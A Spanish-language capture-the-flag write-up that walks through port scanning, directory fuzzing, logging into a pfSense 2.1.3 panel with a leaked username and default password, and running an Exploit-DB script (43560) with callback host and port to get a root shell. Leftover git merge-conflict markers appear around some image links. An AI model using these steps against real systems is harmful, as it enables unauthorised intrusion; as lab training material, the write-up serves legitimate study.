## Escaneo y enumeración

Hago un escaneo de puertos rápido a la IP y tendremos como resultado el puerto 80 y 443, correspondientes a http y https respectivamente. 
```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.24.14
``` 

![](Pasted%20image%2020260424161528.png) 

Después haré un escaneo de versión y con el script http-enum para mostrar algún directorio los cuales investigaremos.
```bash
sudo nmap -sCV -p80,443 --script=http-enum 10.129.24.14
``` 

![](Pasted%20image%2020260424162024.png) 


La página podemos comprobar que es un login de Pfesense 

![](Pasted%20image%2020260424162328.png) 

Y en el txt previamente enumerado podemos ver que han mitigado 2 vulnerabilidades de 3 

![](Pasted%20image%2020260424162418.png)

Al hacerle fuzzing podemos ver que hay muchos más directorios que pueden ser interesantes, los cuáles vamos a enumerar para ver si tienen algún tipo de fichero importante.
<<<<<<< HEAD
<<<<<<< HEAD
![](Pasted%20image%2020260424162705.png) 
=======
![](/Img/Pasted%20image%2020260424162705.png) 
>>>>>>> origin/main
=======
![](/Img/Pasted%20image%2020260424162705.png) 
>>>>>>> origin/main

Después de otra enumeración con un diccionario más grande  y buscando extensiones encuentro un fichero txt interesante que es system-users.txt que al acceder veremos cuales son las credenciales para logearnos.
```bash
gobuster dir --url https://10.129.24.14/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-tls-validation -x php,txt -t 100
```
![](Pasted%20image%2020260424173143.png) 

![](Pasted%20image%2020260424173202.png)

Así que probaré el usuario más la contraseña default de la aplicación Pfsense que suele ser el mismo nombre "pfsense". Y ya estamos dentro del panel de control.

![](Pasted%20image%2020260424173406.png) 

Podemos observar que es la versión 2.1.3 la cuál buscando encontré este script https://www.exploit-db.com/exploits/43560 que no me funcionó, así que gracias a la IA pude modificarlo y hacer que funcione correctamente, el cuál añadiré a la carpeta. Simplemente lo ejecutamos como indica y al poner en escucha tendremos exitosamente acceso al sistema y desde root consiguiendo las dos flags.
```bash
python3 43560.py --rhost 10.129.24.14 --lhost 10.10.14.180 --lport 4444 --username rohit --password pfsense
```

<<<<<<< HEAD
<<<<<<< HEAD
![](Pasted%20image%2020260424183920.png)
=======
![](/img/Pasted%20image%2020260424183920.png)
>>>>>>> origin/main
=======
![](/img/Pasted%20image%2020260424183920.png)
>>>>>>> origin/main
